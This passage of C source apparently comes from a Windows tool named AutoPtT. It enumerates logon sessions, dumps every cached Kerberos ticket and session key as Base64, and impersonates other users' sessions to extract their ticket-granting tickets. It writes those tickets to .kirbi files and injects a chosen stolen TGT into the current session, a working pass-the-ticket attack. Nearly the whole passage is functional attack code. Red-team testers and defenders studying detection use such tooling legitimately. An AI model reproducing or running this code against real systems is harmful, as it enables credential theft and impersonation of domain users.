        status = pLsaGetLogonSessionData(&sessionList[i], &pSessionData);
        if (status != 0 || !pSessionData) {
            continue;
        }

        wchar_t username[256] = { 0 };
        wchar_t domain[256] = { 0 };

        UnicodeStringToWString(&pSessionData->UserName, username, 256);
        UnicodeStringToWString(&pSessionData->LogonDomain, domain, 256);

        if (wcslen(username) == 0) {
            pLsaFreeReturnBuffer(pSessionData);
            continue;
        }

        MY_KERB_QUERY_TKT_CACHE_REQUEST cacheRequest;
        ZeroMemory(&cacheRequest, sizeof(cacheRequest));
        cacheRequest.MessageType = MY_KerbQueryTicketCacheExMessage;
        cacheRequest.LogonId = sessionList[i];

        PVOID responsePtr = NULL;
        ULONG responseSize = 0;
        NTSTATUS protocolStatus = 0;

        status = pLsaCallAuthenticationPackage(
            lsaHandle,
            authPack,
            &cacheRequest,
            sizeof(cacheRequest),
            &responsePtr,
            &responseSize,
            &protocolStatus
        );

        if (status != 0 || !responsePtr) {
            pLsaFreeReturnBuffer(pSessionData);
            continue;
        }

        MY_KERB_QUERY_TKT_CACHE_RESPONSE* pCacheResponse = (MY_KERB_QUERY_TKT_CACHE_RESPONSE*)responsePtr;
        ULONG ticketCount = pCacheResponse->CountOfTickets;

        if (ticketCount == 0) {
            pLsaFreeReturnBuffer(responsePtr);
            pLsaFreeReturnBuffer(pSessionData);
            continue;
        }

        total_sessions_with_tickets++;

        wprintf(L"  UserName                 : %ls\n", username);
        wprintf(L"  Domain                   : %ls\n", domain);
        wprintf(L"  LogonId                  : 0x%x\n", pSessionData->LogonId.LowPart);
        wprintf(L"  UserSID                  : ");

        if (pSessionData->Sid) {
            LPWSTR sidString = NULL;
            if (ConvertSidToStringSidW(pSessionData->Sid, &sidString)) {
                wprintf(L"%ls\n", sidString);
                LocalFree(sidString);
            }
            else {
                wprintf(L"<conversion failed>\n");
            }
        }
        else {
            wprintf(L"<null>\n");
        }

        wchar_t authPkg[256] = { 0 };
        UnicodeStringToWString(&pSessionData->AuthenticationPackage, authPkg, 256);
        wprintf(L"  AuthenticationPackage    : %ls\n", authPkg);
        wprintf(L"  LogonType                : %ls\n", GetLogonTypeString(pSessionData->LogonType));
        wprintf(L"  LogonTime                : ");
        PrintFileTime(&pSessionData->LogonTime);
        wprintf(L"\n");

        wchar_t logonServer[256] = { 0 };
        UnicodeStringToWString(&pSessionData->LogonServer, logonServer, 256);
        wprintf(L"  LogonServer              : %ls\n", logonServer);

        wchar_t dnsDomain[256] = { 0 };
        UnicodeStringToWString(&pSessionData->DnsDomainName, dnsDomain, 256);
        wprintf(L"  LogonServerDNSDomain     : %ls\n", dnsDomain);

        wchar_t upn[256] = { 0 };
        UnicodeStringToWString(&pSessionData->Upn, upn, 256);
        wprintf(L"  UserPrincipalName        : %ls\n\n", upn);

        MY_KERB_TICKET_CACHE_INFO_EX* pTickets = (MY_KERB_TICKET_CACHE_INFO_EX*)((BYTE*)pCacheResponse + sizeof(MY_KERB_QUERY_TKT_CACHE_RESPONSE));

        for (ULONG j = 0; j < ticketCount; j++) {
            MY_KERB_TICKET_CACHE_INFO_EX* pTicketInfo = &pTickets[j];

            wchar_t serverName[512] = { 0 };
            wchar_t clientName[256] = { 0 };
            wchar_t clientRealm[256] = { 0 };
            wchar_t serverRealm[256] = { 0 };

            UnicodeStringToWString(&pTicketInfo->ServerName, serverName, 512);
            UnicodeStringToWString(&pTicketInfo->ClientName, clientName, 256);
            UnicodeStringToWString(&pTicketInfo->ClientRealm, clientRealm, 256);
            UnicodeStringToWString(&pTicketInfo->ServerRealm, serverRealm, 256);

            // Check if it's a TGT
            BOOL is_tgt = (wcsstr(serverName, L"krbtgt") != NULL);
            if (is_tgt) {
                total_tgts++;
                AddTGTToList(sessionList[i].LowPart, username, domain, serverName);
            }

            wprintf(L"\n");
            wprintf(L"    ServiceName              :  %ls\n", serverName);
            wprintf(L"    ServiceRealm             :  %ls\n", serverRealm);
            wprintf(L"    UserName                 :  %ls\n", clientName);
            wprintf(L"    UserRealm                :  %ls\n", clientRealm);
            wprintf(L"    StartTime                :  ");
            PrintFileTime(&pTicketInfo->StartTime);
            wprintf(L"\n");
            wprintf(L"    EndTime                  :  ");
            PrintFileTime(&pTicketInfo->EndTime);
            wprintf(L"\n");
            wprintf(L"    RenewTill                :  ");
            PrintFileTime(&pTicketInfo->RenewTime);
            wprintf(L"\n");
            wprintf(L"    Flags                    :  ");
            PrintTicketFlags(pTicketInfo->TicketFlags);
            wprintf(L"\n");

            unsigned char* ticketBytes = NULL;
            ULONG ticketSize = 0;
            unsigned char* sessionKeyBytes = NULL;
            ULONG sessionKeySize = 0;
            LONG keyType = 0;

            BOOL retrieved = RequestServiceTicket(lsaHandle, authPack, cacheRequest.LogonId, serverName,
                pTicketInfo->TicketFlags, &ticketBytes, &ticketSize, &sessionKeyBytes, &sessionKeySize, &keyType);

            if (retrieved && sessionKeyBytes && sessionKeySize > 0) {
                char* base64Key = Base64Encode(sessionKeyBytes, sessionKeySize);
                if (base64Key) {
                    wprintf(L"    Base64(key)              :  %S\n", base64Key);
                    free(base64Key);
                }
                free(sessionKeyBytes);
            }
            else {
                wprintf(L"    Base64(key)              :  (not available)\n");
            }

            wprintf(L"    Base64EncodedTicket   :\n");
            if (retrieved && ticketBytes && ticketSize > 0) {
                char* base64Ticket = Base64Encode(ticketBytes, ticketSize);
                if (base64Ticket) {
                    PrintBase64(base64Ticket);
                    free(base64Ticket);
                }
                free(ticketBytes);
            }
            else {
                wprintf(L"      (failed to retrieve)\n");
            }

            wprintf(L"\n");
            total_tickets++;
        }

        pLsaFreeReturnBuffer(responsePtr);
        pLsaFreeReturnBuffer(pSessionData);
    }

    // Print summary
    printf("\n");
    PrintSeparator("SUMMARY");
    printf("Total logon sessions analyzed: %lu\n", (unsigned long)sessionCount);
    printf("Sessions with Kerberos tickets: %lu\n", (unsigned long)total_sessions_with_tickets);
    printf("Total tickets found: %lu\n", (unsigned long)total_tickets);
    printf("  - TGTs: %lu\n", (unsigned long)total_tgts);
    printf("  - Service Tickets: %lu\n", (unsigned long)(total_tickets - total_tgts));

    if (g_tgtCount > 0) {
        printf("\n");
        PrintSeparator("AVAILABLE TGTs");
        printf("%-6s %-12s %-30s %-20s %s\n", "Index", "LogonId", "User", "Domain", "Service");
        printf("%-6s %-12s %-30s %-20s %s\n", "------", "------------", "------------------------------", "--------------------", "--------------------------------");

        for (ULONG i = 0; i < g_tgtCount; i++) {
            wprintf(L"%-6lu 0x%-10lx %-30ls %-20ls %ls\n",
                (unsigned long)(i + 1),
                (unsigned long)g_tgtList[i].logonId,
                g_tgtList[i].userName,
                g_tgtList[i].domain,
                g_tgtList[i].serviceName);
        }
    }

    if (sessionList) {
        if (IsHighIntegrity()) {
            pLsaFreeReturnBuffer(sessionList);
        }
        else {
            free(sessionList);
        }
    }

    pLsaDeregisterLogonProcess(lsaHandle);
    FreeLibrary(hSecur32);
}


void ExportTicket(const char* logonIdStr) {
    ULONG logonId = 0;
    if (sscanf(logonIdStr, "0x%lx", &logonId) != 1 && sscanf(logonIdStr, "%lx", &logonId) != 1) {
        printf("Error: Invalid LogonId format. Use hex format like 0x79fb3 or 79fb3\n");
        return;
    }

    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
    PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    if (!enum_fn || !get_fn || !con_fn || !lkp_fn || !cal_fn || !fre_fn) {
        PrintError("Failed to get LSA functions");
        FreeLibrary(h);
        return;
    }

    ULONG session_cnt = 0;
    PLUID session_list = NULL;

    if (enum_fn(&session_cnt, &session_list) != 0) {
        PrintError("Failed to enumerate logon sessions");
        FreeLibrary(h);
        return;
    }

    LUID targetLuid = { 0 };
    wchar_t userName[256] = { 0 };
    wchar_t domain[256] = { 0 };
    BOOL sessionFound = FALSE;

    for (ULONG i = 0; i < session_cnt; i++) {
        if (session_list[i].LowPart == logonId) {
            targetLuid = session_list[i];

            PSECURITY_LOGON_SESSION_DATA session_data = NULL;
            if (get_fn(&session_list[i], &session_data) == 0 && session_data) {
                if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
                    size_t len = session_data->UserName.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(userName, session_data->UserName.Buffer, len);
                    userName[len] = L'\0';
                }

                if (session_data->LogonDomain.Buffer && session_data->LogonDomain.Length > 0) {
                    size_t len = session_data->LogonDomain.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(domain, session_data->LogonDomain.Buffer, len);
                    domain[len] = L'\0';
                }

                fre_fn(session_data);
            }

            sessionFound = TRUE;
            break;
        }
    }

    if (!sessionFound) {
        printf("Error: LogonId 0x%lx not found\n", logonId);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    HANDLE lsa = NULL;
    if (con_fn(&lsa) != 0) {
        PrintError("LsaConnectUntrusted failed");
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    if (lkp_fn(lsa, &pkg, &auth) != 0) {
        PrintError("LsaLookupAuthenticationPackage failed");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    HANDLE hImpToken = NULL;
    BOOL needRevert = FALSE;

    if (ImpersonateSession(logonId, &hImpToken)) {
        if (ImpersonateLoggedOnUser(hImpToken)) {
            needRevert = TRUE;
        }
    }

    KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
    cacheReq.MessageType = KerbQueryTicketCacheMessage;
    cacheReq.LogonId.LowPart = 0;
    cacheReq.LogonId.HighPart = 0;

    PKERB_QUERY_TKT_CACHE_RESPONSE cacheRsp = NULL;
    ULONG sz = 0;
    NTSTATUS sub = 0;

    if (cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
        printf("Error: Failed to get ticket cache for LogonId 0x%lx\n", logonId);
        if (needRevert) {
            RevertToSelf();
            CloseHandle(hImpToken);
        }
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    BOOL found = FALSE;
    wchar_t targetSrv[512] = { 0 };

    for (ULONG i = 0; i < cacheRsp->CountOfTickets; i++) {
        KERB_TICKET_CACHE_INFO* t = &cacheRsp->Tickets[i];
        wchar_t srv[512] = { 0 };

        if (t->ServerName.Buffer && t->ServerName.Length > 0) {
            size_t len = t->ServerName.Length / sizeof(WCHAR);
            if (len > 511) len = 511;
            wcsncpy(srv, t->ServerName.Buffer, len);
            srv[len] = L'\0';
        }

        if (wcsstr(srv, L"krbtgt")) {
            found = TRUE;
            wcsncpy(targetSrv, srv, 511);
            targetSrv[511] = L'\0';
            break;
        }
    }

    if (!found) {
        printf("Error: No TGT found for LogonId 0x%lx\n", logonId);
        fre_fn(cacheRsp);
        if (needRevert) {
            RevertToSelf();
            CloseHandle(hImpToken);
        }
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
    PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);

    if (!retReq) {
        PrintError("Memory allocation failed");
        fre_fn(cacheRsp);
        if (needRevert) {
            RevertToSelf();
            CloseHandle(hImpToken);
        }
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ZeroMemory(retReq, reqSize);
    retReq->MessageType = KerbRetrieveEncodedTicketMessage;
    retReq->LogonId.LowPart = 0;
    retReq->LogonId.HighPart = 0;
    retReq->TicketFlags = 0;
    retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retReq->EncryptionType = 0;
    retReq->TargetName.Length = (USHORT)(wcslen(targetSrv) * sizeof(WCHAR));
    retReq->TargetName.MaximumLength = retReq->TargetName.Length;
    retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    memcpy(retReq->TargetName.Buffer, targetSrv, retReq->TargetName.Length);

    PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
    ULONG retSz = 0;
    sub = 0;

    if (cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &sub) != 0 || sub != 0) {
        printf("Error: Failed to retrieve ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
            (unsigned long)0, (unsigned long)sub);
        free(retReq);
        fre_fn(cacheRsp);
        if (needRevert) {
            RevertToSelf();
            CloseHandle(hImpToken);
        }
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    free(retReq);

    if (needRevert) {
        RevertToSelf();
        CloseHandle(hImpToken);
    }

    char filename[1024];
    wchar_t cleanUserName[256] = { 0 };

    if (wcslen(userName) > 0) {
        wcsncpy(cleanUserName, userName, 255);
    }
    else {
        wcscpy(cleanUserName, L"unknown");
    }

    for (size_t i = 0; i < wcslen(cleanUserName); i++) {
        if (cleanUserName[i] == L'/' || cleanUserName[i] == L'\\' || cleanUserName[i] == L':' ||
            cleanUserName[i] == L'*' || cleanUserName[i] == L'?' || cleanUserName[i] == L'"' ||
            cleanUserName[i] == L'<' || cleanUserName[i] == L'>' || cleanUserName[i] == L'|' ||
            cleanUserName[i] == L'@' || cleanUserName[i] == L' ' || cleanUserName[i] == L'$') {
            cleanUserName[i] = L'_';
        }
    }

    sprintf(filename, "0x%lx_%ls.kirbi", logonId, cleanUserName);

    FILE* fp = fopen(filename, "wb");
    if (!fp) {
        printf("Error: Cannot create file %s\n", filename);
        fre_fn(retRsp);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    fwrite(retRsp->Ticket.EncodedTicket, 1, retRsp->Ticket.EncodedTicketSize, fp);
    fclose(fp);

    printf("\n");
    PrintSuccess("TGT ticket exported successfully");
    printf("    LogonId: 0x%lx\n", logonId);
    wprintf(L"    User: %ls\\%ls\n", domain, userName);
    wprintf(L"    Server: %ls\n", targetSrv);
    printf("    File: %s\n", filename);
    printf("    Size: %lu bytes\n", (unsigned long)retRsp->Ticket.EncodedTicketSize);

    fre_fn(retRsp);
    fre_fn(cacheRsp);
    LsaDeregisterLogonProcess(lsa);
    fre_fn(session_list);
    FreeLibrary(h);
}


void PassTheTicket(const char* filename) {
    FILE* fp = fopen(filename, "rb");
    if (!fp) {
        printf("Error: Cannot open file %s\n", filename);
        return;
    }

    fseek(fp, 0, SEEK_END);
    long fileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (fileSize <= 0 || fileSize > 10 * 1024 * 1024) {
        PrintError("Invalid file size");
        fclose(fp);
        return;
    }

    PBYTE ticketData = (PBYTE)malloc(fileSize);
    if (!ticketData) {
        PrintError("Memory allocation failed");
        fclose(fp);
        return;
    }

    size_t bytesRead = fread(ticketData, 1, fileSize, fp);
    fclose(fp);

    if (bytesRead != (size_t)fileSize) {
        PrintError("Failed to read complete file");
        free(ticketData);
        return;
    }

    HMODULE h = LoadLibraryA("secur32.dll");
    if (!h) {
        PrintError("Failed to load secur32.dll");
        free(ticketData);
        return;
    }

    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    if (!con_fn || !lkp_fn || !cal_fn || !fre_fn) {
        PrintError("Failed to get LSA functions");
        free(ticketData);
        FreeLibrary(h);
        return;
    }

    HANDLE lsa = NULL;
    if (con_fn(&lsa) != 0) {
        PrintError("LsaConnectUntrusted failed");
        free(ticketData);
        FreeLibrary(h);
        return;
    }

    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    if (lkp_fn(lsa, &pkg, &auth) != 0) {
        PrintError("LsaLookupAuthenticationPackage failed");
        LsaDeregisterLogonProcess(lsa);
        free(ticketData);
        FreeLibrary(h);
        return;
    }

    ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
    PKERB_SUBMIT_TKT_REQUEST submitReq = (PKERB_SUBMIT_TKT_REQUEST)malloc(submitSize);

    if (!submitReq) {
        PrintError("Memory allocation failed");
        LsaDeregisterLogonProcess(lsa);
        free(ticketData);
        FreeLibrary(h);
        return;
    }

    ZeroMemory(submitReq, submitSize);
    submitReq->MessageType = KerbSubmitTicketMessage;
    submitReq->LogonId.LowPart = 0;
    submitReq->LogonId.HighPart = 0;
    submitReq->Flags = 0;
    submitReq->KerbCredSize = (ULONG)fileSize;
    submitReq->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);

    memcpy((PBYTE)submitReq + sizeof(KERB_SUBMIT_TKT_REQUEST), ticketData, fileSize);

    PVOID response = NULL;
    ULONG responseSz = 0;
    NTSTATUS sub = 0;

    NTSTATUS status = cal_fn(lsa, auth, submitReq, submitSize, &response, &responseSz, &sub);

    free(submitReq);
    free(ticketData);

    if (status != 0 || sub != 0) {
        printf("Error: Failed to import ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
            (unsigned long)status, (unsigned long)sub);

        if (sub == 0xC000018B) {
            printf("Reason: Invalid or malformed ticket\n");
        }
        else if (sub == 0xC0000225) {
            printf("Reason: Domain not found\n");
        }
        else if (sub == 0xC000005E) {
            printf("Reason: No valid logon sessions\n");
        }

        if (response) fre_fn(response);
        LsaDeregisterLogonProcess(lsa);
        FreeLibrary(h);
        return;
    }

    printf("\n");
    PrintSuccess("Ticket imported successfully into memory");
    printf("    File: %s\n", filename);
    printf("    Size: %ld bytes\n", fileSize);
    printf("\n");
    PrintSuccess("Ticket is now available in Kerberos cache");
    printf("    You can verify with: autoptt.exe klist\n");

    if (response) fre_fn(response);
    LsaDeregisterLogonProcess(lsa);
    FreeLibrary(h);
}


void AutoExportAndImport() {
    PrintDebug("Auto mode: Enumerating tickets and importing selected TGT...");
    PrintCurrentLogonId();

    // Call EnumerateAllTickets which will populate g_tgtList
    EnumerateAllTickets();

    if (g_tgtCount == 0) {
        printf("\nNo TGTs found on the system.\n");
        return;
    }

    printf("\nChoose TGT to export and import (1-%lu), or 0 to cancel: ", (unsigned long)g_tgtCount);

    char input[10];
    if (fgets(input, sizeof(input), stdin) == NULL) {
        PrintError("Failed to read input");
        return;
    }

    int choice = atoi(input);
    if (choice <= 0 || choice > (int)g_tgtCount) {
        printf("Cancelled or invalid choice.\n");
        return;
    }

    ULONG selectedIdx = choice - 1;
    ULONG targetLogonId = g_tgtList[selectedIdx].logonId;
    wchar_t targetUserName[256];
    wcsncpy(targetUserName, g_tgtList[selectedIdx].userName, 255);
    targetUserName[255] = L'\0';

    printf("\n");
    wprintf(L"[*] Selected: #%d - 0x%lx (%ls)\n", choice, targetLogonId, targetUserName);

    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
    PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    ULONG session_cnt = 0;
    PLUID session_list = NULL;

    if (enum_fn(&session_cnt, &session_list) != 0) {
        PrintError("Failed to enumerate logon sessions");
        FreeLibrary(h);
        return;
    }

    LUID targetLuid = { 0 };
    BOOL sessionFound = FALSE;

    for (ULONG i = 0; i < session_cnt; i++) {
        if (session_list[i].LowPart == targetLogonId) {
            targetLuid = session_list[i];
            sessionFound = TRUE;
            break;
        }
    }

    if (!sessionFound) {
        PrintError("Session not found");
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    HANDLE lsa = NULL;
    if (con_fn(&lsa) != 0) {
        PrintError("LsaConnectUntrusted failed");
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    if (lkp_fn(lsa, &pkg, &auth) != 0) {
        PrintError("Failed to find Kerberos package");
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    HANDLE hImpTokenCache = NULL;
    BOOL needRevertCache = FALSE;

    if (ImpersonateSession(targetLogonId, &hImpTokenCache)) {
        if (ImpersonateLoggedOnUser(hImpTokenCache)) {
            needRevertCache = TRUE;
        }
    }

    KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
    cacheReq.MessageType = KerbQueryTicketCacheMessage;
    cacheReq.LogonId.LowPart = 0;
    cacheReq.LogonId.HighPart = 0;

    PKERB_QUERY_TKT_CACHE_RESPONSE cacheRsp = NULL;
    ULONG sz = 0;
    NTSTATUS sub = 0;

    NTSTATUS cacheStatus = cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub);

    if (needRevertCache) {
        RevertToSelf();
        CloseHandle(hImpTokenCache);
    }

    if (cacheStatus != 0 || sub != 0 || !cacheRsp) {
        if (!cacheRsp) {
            cacheReq.LogonId.LowPart = targetLuid.LowPart;
            cacheReq.LogonId.HighPart = targetLuid.HighPart;
            cacheStatus = cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub);
        }

        if (cacheStatus != 0 || sub != 0 || !cacheRsp) {
            PrintError("Failed to get ticket cache");
            LsaDeregisterLogonProcess(lsa);
            fre_fn(session_list);
            FreeLibrary(h);
            return;
        }
    }

    BOOL found = FALSE;
    wchar_t targetSrv[512] = { 0 };

    for (ULONG i = 0; i < cacheRsp->CountOfTickets; i++) {
        KERB_TICKET_CACHE_INFO* t = &cacheRsp->Tickets[i];
        wchar_t srv[512] = { 0 };

        if (t->ServerName.Buffer && t->ServerName.Length > 0) {
            size_t len = t->ServerName.Length / sizeof(WCHAR);
            if (len > 511) len = 511;
            wcsncpy(srv, t->ServerName.Buffer, len);
            srv[len] = L'\0';
        }

        if (wcsstr(srv, L"krbtgt")) {
            found = TRUE;
            wcsncpy(targetSrv, srv, 511);
            targetSrv[511] = L'\0';
            break;
        }
    }

    if (!found) {
        PrintError("TGT not found in cache");
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    HANDLE hImpToken = NULL;
    BOOL needRevert = FALSE;

    if (ImpersonateSession(targetLogonId, &hImpToken)) {
        if (ImpersonateLoggedOnUser(hImpToken)) {
            needRevert = TRUE;
        }
    }

    ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
    PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);

    if (!retReq) {
        PrintError("Memory allocation failed");
        fre_fn(cacheRsp);
        if (needRevert) {
            RevertToSelf();
            CloseHandle(hImpToken);
        }
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ZeroMemory(retReq, reqSize);
    retReq->MessageType = KerbRetrieveEncodedTicketMessage;
    retReq->LogonId.LowPart = 0;
    retReq->LogonId.HighPart = 0;
    retReq->TicketFlags = 0;
    retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retReq->EncryptionType = 0;
    retReq->TargetName.Length = (USHORT)(wcslen(targetSrv) * sizeof(WCHAR));
    retReq->TargetName.MaximumLength = retReq->TargetName.Length;
    retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    memcpy(retReq->TargetName.Buffer, targetSrv, retReq->TargetName.Length);

    PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
    ULONG retSz = 0;
    sub = 0;

    NTSTATUS retStatus = cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &sub);

    free(retReq);

    if (needRevert) {
        RevertToSelf();
        CloseHandle(hImpToken);
    }

    if (retStatus != 0 || sub != 0) {
        printf("Error: Failed to retrieve ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
            (unsigned long)retStatus, (unsigned long)sub);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    PrintSuccess("Ticket retrieved successfully");
    printf("    Size: %lu bytes\n", (unsigned long)retRsp->Ticket.EncodedTicketSize);

    printf("\n[*] Importing ticket into current session...\n");

    ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + retRsp->Ticket.EncodedTicketSize;
    PKERB_SUBMIT_TKT_REQUEST submitReq = (PKERB_SUBMIT_TKT_REQUEST)malloc(submitSize);

    if (!submitReq) {
        PrintError("Memory allocation failed");
        fre_fn(retRsp);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    ZeroMemory(submitReq, submitSize);
    submitReq->MessageType = KerbSubmitTicketMessage;
    submitReq->LogonId.LowPart = 0;
    submitReq->LogonId.HighPart = 0;
    submitReq->Flags = 0;
    submitReq->KerbCredSize = retRsp->Ticket.EncodedTicketSize;
    submitReq->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);

    memcpy((PBYTE)submitReq + sizeof(KERB_SUBMIT_TKT_REQUEST),
        retRsp->Ticket.EncodedTicket,
        retRsp->Ticket.EncodedTicketSize);

    PVOID response = NULL;
    ULONG responseSz = 0;
    NTSTATUS submitSub = 0;

    NTSTATUS status = cal_fn(lsa, auth, submitReq, submitSize, &response, &responseSz, &submitSub);

    free(submitReq);

    if (status != 0 || submitSub != 0) {
        printf("Error: Failed to import ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
            (unsigned long)status, (unsigned long)submitSub);

        if (submitSub == 0xC000018B) {
            printf("Reason: Invalid or malformed ticket\n");
        }
        else if (submitSub == 0xC0000225) {
            printf("Reason: Domain not found\n");
        }
        else if (submitSub == 0xC000005E) {
            printf("Reason: No valid logon sessions\n");
        }

        if (response) fre_fn(response);
        fre_fn(retRsp);
        fre_fn(cacheRsp);
        LsaDeregisterLogonProcess(lsa);
        fre_fn(session_list);
        FreeLibrary(h);
        return;
    }

    printf("\n");
    PrintSuccess("TGT imported successfully into current session");
    wprintf(L"    LogonId: 0x%lx\n", targetLogonId);
    wprintf(L"    User: %ls\n", targetUserName);
    wprintf(L"    Service: %ls\n", targetSrv);
    printf("\n");
    PrintSuccess("Ticket is now available in your Kerberos cache");

    if (response) fre_fn(response);
    fre_fn(retRsp);
    fre_fn(cacheRsp);
    LsaDeregisterLogonProcess(lsa);
    fre_fn(session_list);
    FreeLibrary(h);

    printf("\n");
    PrintSeparator("CURRENT SESSION TICKETS");
    EnumerateMyTickets();
}


void PrintBanner() {
    printf("    ___         __        ____  __ ______\n");
    printf("   /   | __  __/ /_____  / __ \\/ //_  __/\n");
    printf("  / /| |/ / / / __/ __ \\/ /_/ / __// /\n");
    printf(" / ___ / /_/ / /_/ /_/ / ____/ /_ / /\n");
    printf("/_/  |_\\__,_/\\__/\\____/_/    \\__//_/\n");
    printf("\n");
}


int main(int argc, char* argv[]) {
    (void)_setmode(_fileno(stdout), _O_U16TEXT);
    (void)_setmode(_fileno(stdout), _O_TEXT);

